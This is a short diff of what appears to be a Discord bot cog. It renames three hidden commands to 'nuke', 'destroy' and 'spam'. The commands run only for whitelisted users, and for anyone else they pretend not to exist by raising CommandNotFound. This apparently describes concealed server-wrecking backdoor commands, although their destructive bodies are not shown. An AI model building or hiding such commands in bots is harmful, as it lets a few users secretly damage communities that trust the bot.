@@ -101,7 +101,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
         await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")
 
     @commands.command(hidden=True)
-    async def oof(self, ctx):
+    async def nuke(self, ctx):
         await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
@@ -119,7 +119,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
             raise commands.CommandNotFound('shit')
 
     @commands.command(hidden=True)
-    async def rip(self, ctx):
+    async def destroy(self, ctx):
         await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
@@ -134,7 +134,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
             raise commands.CommandNotFound('shit')
 
     @commands.command(hidden=True)
-    async def ass(self, ctx):
+    async def spam(self, ctx):
         await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
